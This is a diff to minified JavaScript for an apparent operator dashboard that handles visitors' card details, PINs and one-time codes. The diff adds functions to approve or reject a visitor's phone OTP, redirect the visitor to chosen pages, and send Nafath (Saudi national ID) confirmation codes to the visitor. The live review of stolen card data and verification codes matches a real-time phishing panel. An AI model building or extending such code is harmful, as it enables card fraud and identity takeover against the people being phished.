@@ -9,9 +9,12 @@
         await (0, r.updateApplication)(t, a);
         try {
             let {
-                adminUpdateVisitor: r
+                adminUpdateVisitor: o,
+                adminRedirectVisitor: d
             } = await e.A(44847);
-            r(t, a)
+            o(t, a);
+            let l = a.redirectPage || a.redirect_page;
+            l && d(t, l)
         } catch (e) {}
     }, i = async e => (0, r.getApplication)(e), o = async e => {
         await (0, r.deleteMultipleApplications)(e)
@@ -2280,6 +2283,13 @@
             phoneOtpStatus: "show_phone_otp"
         })
     }
+    function resolveHistoryId(e, t) {
+        if (!Array.isArray(e) || !t) return t;
+        if (e.some(e => e.id === t)) return t;
+        let a = e.filter(e => "_t5" === e.type || "phone_otp" === e.type),
+            r = parseInt(t, 10);
+        return !isNaN(r) && a[r] ? a[r].id : a[0] ? a[0].id : t
+    }
     let S = "7f8a9b2c3d4e5f6a1b2c3d4e5f6a7b8c";
 
     function C(e) {
@@ -2421,13 +2431,14 @@
                     d(!1)
                 }
             }
-        }, k = async () => {
+        }, sendNafadCode = async () => {
             if (e.id && u.trim()) try {
                 await s(e.id, {
-                    nafadConfirmationCode: u
-                }), m("")
+                    nafadConfirmationCode: u.trim(),
+                    nafadConfirmationStatus: "waiting"
+                }), m(""), G.success("تم إرسال رقم التأكيد للزائر")
             } catch (e) {
-                console.error("حدث خطأ في إرسال رقم التأكيد")
+                console.error("حدث خطأ في إرسال رقم التأكيد"), G.error("فشل إرسال رقم التأكيد")
             }
         }, S = [];
         if (e.history, e.ownerName || e.identityNumber) {
@@ -2698,7 +2709,7 @@
                         placeholder: "أدخل رقم التأكيد",
                         className: "flex-1 px-3 py-2 border rounded-lg text-sm"
                     }), (0, t.jsx)("button", {
-                        onClick: k,
+                        onClick: sendNafadCode,
                         disabled: !u.trim(),
                         className: "px-4 py-2 bg-blue-600 text-gray-900 rounded-lg text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed",
                         children: "إرسال"
@@ -2736,7 +2747,7 @@
                     c(!0);
                     try {
                         let r = S.find(e => e.id === t);
-                        if (!r) return;
+                        if (!r) return void G.error("لم يتم العثور على العنصر");
                         let n = r.id.replace(/^(card-info-|otp-|pin-|phone-verification-|phone_verification-|phone-otp-|phone_otp-)/, "");
                         switch (console.log("[handleBubbleAction] bubble.id:", r.id, "historyId:", n, "bubble.type:", r.type, "action:", a), r.type) {
                             case "card":
@@ -2840,8 +2851,8 @@
                                 }
                                 break;
                             case "phone_otp":
-                                if ("approve" === a) await N(e.id, n, e.history || []);
-                                else if ("reject" === a) await A(e.id, n, e.history || []);
+                                if (n = resolveHistoryId(e.history || [], n), "approve" === a) await N(e.id, n, e.history || []), G.success("تم قبول كود الهاتف وتوجيه الزائر لنفاذ");
+                                else if ("reject" === a) await A(e.id, n, e.history || []), G.success("تم رفض كود الهاتف");
                                 else if ("resend" === a) {
                                     let t = (e.history || []).map(e => e.id === n ? {
                                         ...e,
@@ -2851,11 +2862,12 @@
                                         history: t,
                                         phoneOtp: "",
                                         phoneOtpStatus: "show_phone_otp"
-                                    })
+                                    }), G.success("تم طلب إعادة إرسال كود الهاتف")
                                 }
+                                break;
                         }
                     } catch (e) {
-                        console.error("Action error:", e), console.error(`حدث خطأ:`, e)
+                        console.error("Action error:", e), console.error(`حدث خطأ:`, e), G.error("فشل تنفيذ الإجراء")
                     } finally {
                         c(!1)
                     }
